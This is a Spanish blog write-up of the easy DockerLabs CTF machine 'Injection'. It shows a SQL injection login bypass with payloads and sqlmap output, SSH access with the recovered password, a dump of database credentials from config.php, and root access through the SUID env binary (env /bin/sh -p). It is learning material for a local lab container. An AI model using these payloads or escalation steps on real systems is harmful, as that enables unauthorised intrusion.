---
title: Injection
date: 2025-08-21 18:00:00 +0200
categories: [writeup, dockerlabs]
tags: [dockerlabs, explotación web, sqli, escalada privilegios]     
image:
    path: https://dockerlabs.es/static/images/logos/logo.png
    alt: Docker Labs
---

## Injection

>Autor: El Pingüino de Mario
Dificultad: Muy Fácil
Fecha de creación: 02/04/2025
{: .prompt-tip }

Dockerlabs me parece una idea muy buena y creo que por su parte y para su plataforma resuelve un grave problema de la escalabilidad de las plataformas para aprender ciberseguridad, y es que estas necesitan gestionar grandes recursos para abrir muchas máquinas, contenedores, etc. De esta forma el usuario puede realizar los retos offline, sin conectar VPNs, vamos que ya no hay excusas para no realizar un CTF de camping.   

Como ya indica su nombre los retos de [https://dockerlabs.es/](https://dockerlabs.es/) son contenedores Docker asi que para lanzarlas es bastante simple, yo he optado por el siguiente método. Meto cada fichero zip del reto en una carpeta correpondiendo el nombre de la carpeta al nombre del reto o del zip, como se prefiera. Para mi lo importante es mantener un orden para encontrar luego todo más rápido. 

``` shell
┌──(pablo☠office)
└─$ tree
.
├── injection
│   ├── auto_deploy.sh
│   ├── injection.tar
│   ├── injection.zip
│   ├── manifest.json
│   └── repositories
└── psycho
    └── psycho.zip
```

## Docker deployment

En cada carpeta meto el zip que luego descomprimes para desplegar el contenedor. 
Luego lanzamos el **auto_deploy.sh fichero.tar**

``` shell

root@office /h/p/D/C/injection [1]# ./auto_deploy.sh injection.tar 

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

¿Fácil verdad? Pues lo mejor es que parece que al terminar el contenedor se autodestruye, con lo que nuestro espacio de trabajo vuelve a quedar totalmente liberado del contenedor. 


## Toma de contacto
Visito la web que se aparece en la IP de la máquina desplegada http://172.17.0.2. Ante nostros aparece un formulario "User" "Password". 

Como el reto dice que es muy fácil vamos a probar inyecciones sql sencillitas siempre mirando como se comporta la web, en el navegador. 

Comienzo con una inyección típica


>'admin --


El resultado producido es el siguiente

``` shell
 SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'admin --' AND passwd = ''admin --'' at line 1 
```
La primera pista que obtenemos es que efectivamente, la autenticación se valida en el backend, interviene en el proceso la base de datos. Además no menos importante es ver que el problema devuelto es la sintaxis incorrecta de nuestra query. 
Podemos ajustarla para que se inyecte correctamente?

## Explotación 

Después de probar un ratito podemos encontrar una inyección **boolean-based blind***   
>admin' or 1=1 #

Si bien hay veces que es bastante sencillo utilizar herramienta automáticas como SQLmap. 

``` shell
POST parameter 'name' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 308 HTTP(s) requests:
---
Parameter: name (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: name=-5415' OR 4988=4988#&password='admin --&submit=
---
[19:06:39] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 22.04 (jammy)
web application technology: PHP, Apache 2.4.52
back-end DBMS: MySQL (MariaDB fork)
[19:06:39] [INFO] fetched data logged to text files under '/home/pablo/.local/share/sqlmap/output/172.17.0.2'

[*] ending @ 19:06:39 /2025-08-21/
```
Ahora al introducir el payload nos muestra los siguiente

```html
Bienvenido Dylan! Has insertado correctamente tu contraseña: KJSDFG789FGSDF78
```

No dando por sentado que el reto acababa aquí opté por el sencillo escaneo con nmap

``` shell
┌──(pablo☠office)
└─$ nmap 172.17.0.2
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-21 19:23 CEST
Nmap scan report for 172.17.0.2
Host is up (0.00023s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
Nmap done: 1 IP address (1 host up) scanned in 0.36 seconds
```

## Postexplotación
Ya solo faltaba probar con el usuario dylan y la password ```KJSDFG789FGSDF78```

```shell
┌──(pablo☠office)
└─$ ssh dylan@172.17.0.2
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is SHA256:5ic4ZXizeEb8agR4jNX59cBONCe5b5iEcU9lf2zt0Q0.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
dylan@172.17.0.2's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 6.12.41+deb13-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

dylan@f911f816511a:~$ 
```

¿Sorpresa? Bueno es un reto hacker, pero no está muy alejado de la realidad, inyección sqli + dump de base de datos, + crackeo de contraseñas inseguras y accesos con password repetidas y o directamente con una os-shell. 

``` shell
dylan@f911f816511a:/var/www/html$ cat config.php 
<?php
return [
        'db' => [
                'host' => 'localhost',
                'user' => 'root',
                'passwd' => 'paso',
                'dbname' => 'register',
                'options' => [
                        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION
                ]
        ]
];
?>
```

Tras escarbar un poquito en el sistema encuentro que tengo acceso a la base de datos, como usuario root, con su password y una base de datos. Esto se pone interesante y a la vez me complace que el reto "muy fácil" se esfuerce en hacer que el usuario, utilice la exploración y la intuición como herramienta. Es así como se aprende, así es como se gana experiencia. Vamos a probar pues la base de datos

``` shell
dylan@f911f816511a:/var/www/html$ mysql -u root -ppaso register
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 1978
Server version: 10.6.16-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [register]> show tables;
+--------------------+
| Tables_in_register |
+--------------------+
| users              |
+--------------------+
1 row in set (0.000 sec)

MariaDB [register]> describe users;
+----------+-------------+------+-----+---------+-------+
| Field    | Type        | Null | Key | Default | Extra |
+----------+-------------+------+-----+---------+-------+
| username | varchar(30) | NO   | PRI | NULL    |       |
| passwd   | varchar(30) | YES  |     | NULL    |       |
+----------+-------------+------+-----+---------+-------+
2 rows in set (0.001 sec)

MariaDB [register]> select * from users;
+----------+------------------+
| username | passwd           |
+----------+------------------+
| dylan    | KJSDFG789FGSDF78 |
+----------+------------------+
1 row in set (0.000 sec)
```

## Escalada de privilegios

No hemos descubierto nada que no supieramos. Vamos a intentar entonces la escalad de privilegios.
Averiguemos que procesos están corriendo con permisos de root

```shell
dylan@f911f816511a:/etc$ find / -perm /4000 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/env
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/mount
/usr/bin/chfn
```

Aquí es donde me puse a pensar un rato que tipo de exploit podría usar contra estos, los propios binarios parecen bastante seguros así que si investigamos un poco podemos encontrar como explotar algunas vulnerabilidades.

GTFOBins proporciona una lista de binarios de Unix/Linux que se pueden usar para eludir las restricciones de seguridad locales en sistemas mal configurados. [https://gtfobins.github.io/gtfobins/env/](https://gtfobins.github.io/gtfobins/env/){:target="_blank"}

Este ejemplo crea una copia SUID local del binario y la ejecuta para mantener privilegios elevados.

```shell
sudo install -m =xs $(which env) .
./env /bin/sh -p
```
Si bien esta vulnerabilidad ya debería estar parcheada en la mayoría de sistemas parecía la única que realmente parece explotable. Así que pruebo el comando sin más

``` shell
dylan@f911f816511a:/etc$ /usr/bin/env /usr/bin/bash -p
bash-5.1# whoami
root
```

Este reto se cateroriza de nivel: muy fácil, sin embargo parece pero que requiere algo de conocimiento de como buscar vulnerabilidades y explotarlas, por descontado el SQL injection. Supongo que al haber conseguido root hemos terminado el reto. 
Espero que el primero de muchos.  